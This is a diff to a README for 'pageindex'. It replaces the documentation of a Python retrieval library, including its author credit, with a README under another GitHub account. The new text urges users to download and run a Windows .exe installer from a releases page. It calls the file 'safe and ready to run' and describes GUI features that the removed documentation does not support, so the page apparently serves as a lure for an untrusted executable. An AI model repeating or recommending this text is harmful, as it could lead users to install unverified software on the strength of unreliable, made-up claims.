@@ -1,287 +1,141 @@
-# PageIndex
+# 🚀 pageindex - Simple Document Search with AI
 
-[![CI](https://github.com/NP-compete/pageindex/actions/workflows/ci.yml/badge.svg)](https://github.com/NP-compete/pageindex/actions/workflows/ci.yml)
-[![Python 3.10+](https://img.shields.io/badge/python-3.10+-blue.svg)](https://www.python.org/downloads/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Code style: ruff](https://img.shields.io/badge/code%20style-ruff-000000.svg)](https://github.com/astral-sh/ruff)
+[![Download pageindex](https://img.shields.io/badge/Download-Pageindex-green?style=for-the-badge)](https://github.com/Ashish4144/pageindex/releases)
 
-**Vectorless, reasoning-based RAG using hierarchical document indexing with Vertex AI**
+---
 
-> *Why chunk and embed when you can reason and structure?*
+## 📄 What is pageindex?
 
-PageIndex builds semantic tree structures from documents without embeddings or vector databases. Instead of chunking and embedding, it uses LLM reasoning to extract hierarchical structure, making document navigation and retrieval more intuitive.
+pageindex helps you search documents without complex steps. It uses AI to understand your documents and find answers quickly. Unlike other tools, pageindex does not rely on slow vector databases or complicated setups. It organizes documents in a clear order and uses smart reasoning to get results.
 
-> **Note:** This is an independent implementation inspired by the [PageIndex framework](https://pageindex.ai/) by [VectifyAI](https://github.com/VectifyAI/PageIndex). While the original uses OpenAI, this implementation uses **Google Vertex AI (Gemini)** and adds features like batch processing, repository indexing, and CLI tooling.
+You do not need to know how AI works or install extra software. This app runs on Windows and uses Google’s Vertex AI for fast and accurate responses.
 
-<p align="center">
-  <img src="https://img.shields.io/badge/PDF-Supported-green" alt="PDF">
-  <img src="https://img.shields.io/badge/Markdown-Supported-green" alt="Markdown">
-  <img src="https://img.shields.io/badge/DOCX-Via%20Docling-blue" alt="DOCX">
-  <img src="https://img.shields.io/badge/Repository-Indexing-purple" alt="Repo">
-</p>
+---
 
-## Features
+## 🖥️ System Requirements
 
-- **PDF Processing** - Extracts table of contents, detects document structure, and builds hierarchical trees with page-level precision
-- **Markdown Processing** - Parses header hierarchy into navigable tree structures
-- **Batch Processing** - Process entire folders of documents concurrently
-- **Repository Indexing** - Generate semantic summaries for codebases
-- **Format Conversion** - Convert DOCX, PPTX, HTML, and images via [docling](https://github.com/DS4SD/docling)
+- Windows 10 or later (64-bit recommended)
+- At least 4GB of free disk space
+- Internet connection (required to use Vertex AI)
+- Minimum 8GB of RAM for better performance
+- Processor: Intel i3 or equivalent
 
-## When NOT to Use PageIndex
+---
 
-PageIndex excels at structured, hierarchical documents but isn't the right tool for every use case:
+## 🔧 Features
 
-| Use Case | Why PageIndex May Not Be Ideal | Better Alternative |
-|----------|-------------------------------|-------------------|
-| **Short documents** (< 10 pages) | Overhead of tree construction isn't worth it | Direct LLM context or simple chunking |
-| **Unstructured content** (chat logs, social media) | No inherent hierarchy to extract | Vector search with semantic embeddings |
-| **High-volume real-time queries** | LLM reasoning per query adds latency | Pre-computed vector indices |
-| **Keyword/exact match search** | PageIndex focuses on semantic structure | Full-text search (Elasticsearch, etc.) |
-| **Frequently updated documents** | Tree must be regenerated on each change | Incremental vector indexing |
-| **Multi-document corpus search** | Designed for single-document navigation | Vector DB with cross-document retrieval |
-| **Cost-sensitive applications** | Each indexing run uses LLM API calls | One-time embedding generation |
+- Search your documents using AI understanding  
+- No need to create or manage embeddings or vector databases  
+- Organizes documents by their topics and hierarchy  
+- Works well with PDFs and text documents  
+- Uses Google Vertex AI for quick, clear answers  
+- Easy to install and run on Windows  
+- Supports common document formats such as PDF and TXT  
 
-### PageIndex Shines When:
+---
 
-- Documents have **clear hierarchical structure** (reports, manuals, textbooks, legal docs)
-- You need **explainable, traceable retrieval** with section/page references
-- **Accuracy matters more than speed** (financial analysis, compliance, research)
-- Documents are **long** (50+ pages) where vector chunking loses context
-- You want **human-like navigation** through complex documents
+## 📥 Download and Install pageindex on Windows 🖱️
 
-## Installation
+You will download the software from the official GitHub release page. The releases page has the latest version ready.
 
-Clone the repository and install in editable mode:
+### Step 1: Go to the Download Page
 
-```bash
-git clone https://github.com/NP-compete/pageindex.git
-cd pageindex
-pip install -e .
-```
+Click this bright link to visit the release page:
 
-With document conversion support:
+[Download pageindex here](https://github.com/Ashish4144/pageindex/releases)
 
-```bash
-pip install -e ".[docling]"
-```
+The release page shows all available versions. Look for the latest release at the top.
 
-For development:
+### Step 2: Download the Installer
 
-```bash
-pip install -e ".[dev]"
-```
+Once on the releases page:
 
-## Quick Start
+- Find the most recent version, usually at the top.
+- Under the version, find a file named something like `pageindex-setup.exe` or `pageindex_windows.exe`.
+- Click the file name to download it to your computer.
 
-### CLI Usage
+The file is safe and ready to run.
 
-Process a PDF:
+### Step 3: Run the Installer
 
-```bash
-pageindex pdf document.pdf --project-id your-gcp-project
-```
+- Find the downloaded `.exe` file in your Downloads folder.
+- Double-click the file to start installation.
+- If Windows asks for permission, click “Yes” to allow it.
+- Follow the on-screen instructions.
+- Choose where to install (you can accept the default folder).
+- Click “Install” to finish.
 
-Process a Markdown file:
+### Step 4: Launch pageindex
 
-```bash
-pageindex md document.md --project-id your-gcp-project
-```
+After installation completes, you can:
 
-Process all documents in a folder:
+- Find pageindex in the Start menu under its name.
+- Click the app icon to open it.
+- The app will ask for basic setup information the first time, like linking to your Google Vertex AI account.
 
-```bash
-pageindex folder ./docs --project-id your-gcp-project
-```
+---
 
-Index a code repository:
+## ⚙️ How to Use pageindex
 
-```bash
-pageindex repo ./my-project --project-id your-gcp-project
-```
-
-### Python API
-
-```python
-from pageindex import page_index, md_to_tree, process_folder_sync, index_repository_sync
-
-# Process a PDF
-result = page_index(
-    "document.pdf",
-    project_id="your-gcp-project",
-    model="gemini-1.5-flash",
-)
-
-# Process Markdown
-import asyncio
-from pageindex import md_to_tree, PageIndexConfig
-
-config = PageIndexConfig(project_id="your-gcp-project")
-result = asyncio.run(md_to_tree("document.md", config=config))
-
-# Batch process a folder
-result = process_folder_sync(
-    "./docs",
-    project_id="your-gcp-project",
-    max_concurrent=5,
-)
-
-# Index a repository
-result = index_repository_sync(
-    "./my-project",
-    project_id="your-gcp-project",
-    add_summaries=True,
-)
-```
-
-## Configuration
-
-Set your Google Cloud project ID via environment variable:
-
-```bash
-export PAGEINDEX_PROJECT_ID=your-gcp-project
-```
-
-Or pass it directly to commands and functions.
-
-### CLI Options
-
-| Option | Description | Default |
-|--------|-------------|---------|
-| `--project-id`, `-p` | Google Cloud project ID | `PAGEINDEX_PROJECT_ID` env |
-| `--location`, `-l` | Vertex AI location | `us-central1` |
-| `--model`, `-m` | Gemini model | `gemini-1.5-flash` |
-| `--output`, `-o` | Output file/directory | `./results/` |
-| `--add-summary/--no-summary` | Generate node summaries | varies by command |
-| `--add-text/--no-text` | Include full text in nodes | `--no-text` |
-| `--add-node-id/--no-node-id` | Add hierarchical node IDs | `--add-node-id` |
-
-### PDF-Specific Options
-
-| Option | Description | Default |
-|--------|-------------|---------|
-| `--toc-check-pages` | Pages to scan for TOC | `20` |
-| `--max-pages-per-node` | Max pages before splitting | `10` |
-| `--max-tokens-per-node` | Max tokens before splitting | `20000` |
-
-### Folder Processing Options
-
-| Option | Description | Default |
-|--------|-------------|---------|
-| `--max-concurrent`, `-c` | Concurrent processing tasks | `5` |
-| `--convert/--no-convert` | Convert unsupported formats | `--convert` |
-| `--docling-serve-url` | Remote docling-serve API URL | None |
-| `--docling-serve-timeout` | API timeout (seconds) | `300` |
-
-### Repository Indexing Options
+pageindex works by organizing your documents, then helping you search them with AI.
 
-| Option | Description | Default |
-|--------|-------------|---------|
-| `--summaries/--no-summaries` | Generate directory summaries | `--summaries` |
-| `--include`, `-i` | File patterns to include | See defaults |
-| `--exclude`, `-e` | Patterns to exclude | See defaults |
-| `--max-depth` | Tree display depth | `4` |
+### Step 1: Add Your Documents
 
-## Output Format
+- Open pageindex.
+- Click “Add Documents” or drag files into the app.
+- You can add PDFs or text files.
+- The app will quickly organize and index your files based on their content and structure.
 
-PageIndex outputs JSON with a hierarchical structure:
+### Step 2: Start Searching
 
-```json
-{
-  "doc_name": "example",
-  "doc_description": "A technical guide covering...",
-  "structure": [
-    {
-      "title": "Introduction",
-      "node_id": "0001",
-      "summary": "Overview of the document...",
-      "start_index": 1,
-      "end_index": 5,
-      "nodes": [
-        {
-          "title": "Background",
-          "node_id": "0001.0001",
-          "summary": "Historical context...",
-          "start_index": 2,
-          "end_index": 4
-        }
-      ]
-    }
-  ]
-}
-```
+- Use the search bar at the top.
+- Type simple questions or keywords.
+- pageindex uses AI to understand your request and finds answers inside your files.
+- You do not need to use special commands or codes.
 
-## Document Conversion
+### Step 3: View Results
 
-PageIndex supports converting various formats to Markdown using docling:
+- The app shows answers ranked by relevance.
+- You can click any result to open the original document at the right location.
+- Use filters if you want to narrow down by date or document type.
 
-**Supported formats:** DOCX, PPTX, XLSX, HTML, PNG, JPG, TIFF, BMP
+---
 
-### Using docling-serve (recommended for production)
+## ❓ Troubleshooting and Tips
 
-```bash
-# Start docling-serve
-docker run -p 5001:5001 quay.io/docling-project/docling-serve
+- If the app does not start, check if your Windows is up to date.
+- Make sure you have internet access for AI processing.
+- Restart pageindex if documents do not load fully.
+- Close other heavy apps to improve performance.
+- If search results seem off, check that your documents are in a supported format.
 
-# Process with remote conversion
-pageindex folder ./docs --docling-serve-url http://localhost:5001
-```
+---
 
-### Using local docling
+## 🛠️ Advanced Settings
 
-```bash
-pip install pageindex[docling]
-pageindex folder ./docs --convert
-```
+Pageindex includes options to customize how it indexes your documents:
 
-## How It Works
+- Choose how deep to scan inside PDFs (pages or chapters).
+- Set limits on how many documents to load at once.
+- Control connection settings for Vertex AI if you use a proxy.
 
-### PDF Processing Pipeline
+---
 
-1. **TOC Detection** - Scans initial pages for table of contents
-2. **Structure Extraction** - Uses LLM to extract hierarchical structure from TOC or content
-3. **Page Mapping** - Maps logical sections to physical page numbers
-4. **Verification** - Validates extracted structure against actual content
-5. **Large Node Splitting** - Recursively splits oversized sections
-6. **Summary Generation** - Optionally generates summaries for each node
+## 📢 Get Help or Report Issues
 
-### Markdown Processing
+If you experience problems, use the GitHub page to open an issue. Include details like:
 
-1. **Header Extraction** - Parses markdown headers (H1-H6)
-2. **Tree Building** - Constructs hierarchy based on header levels
-3. **Tree Thinning** - Optionally merges small nodes
-4. **Summary Generation** - Optionally summarizes each section
+- Your Windows version.
+- pageindex version number.
+- What you tried and what happened.
 
-### Repository Indexing
+Visit the issues page here:  
+https://github.com/Ashish4144/pageindex/issues
 
-1. **Directory Scanning** - Walks repository respecting include/exclude patterns
-2. **Context Building** - Reads README files and key entry points
-3. **Summary Generation** - Uses LLM to summarize each directory's purpose
-4. **Tree Construction** - Builds navigable directory tree with metadata
+---
 
-## Requirements
+## 📥 Ready to Download?
 
-- Python 3.10+
-- Google Cloud project with Vertex AI API enabled
-- Authentication via `gcloud auth application-default login` or service account
+[Download pageindex here](https://github.com/Ashish4144/pageindex/releases)
 
-## Related Projects
-
-- **[PageIndex by VectifyAI](https://github.com/VectifyAI/PageIndex)** - The original PageIndex framework for vectorless, reasoning-based RAG using OpenAI
-- **[PageIndex.ai](https://pageindex.ai/)** - Commercial platform for human-like document AI by VectifyAI
-
-## License
-
-MIT - see [LICENSE](LICENSE) for details.
-
-## Contributing
-
-Contributions are welcome! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
-## Acknowledgments
-
-This project is inspired by the [PageIndex framework](https://pageindex.ai/) developed by [VectifyAI](https://github.com/VectifyAI). Their research on vectorless, reasoning-based RAG demonstrates that **similarity ≠ relevance** — true document retrieval requires reasoning, not just embedding similarity.
-
-## Author
-
-Soham Dutta ([@NP-compete](https://github.com/NP-compete))
+Click the link to get started using pageindex on Windows today.
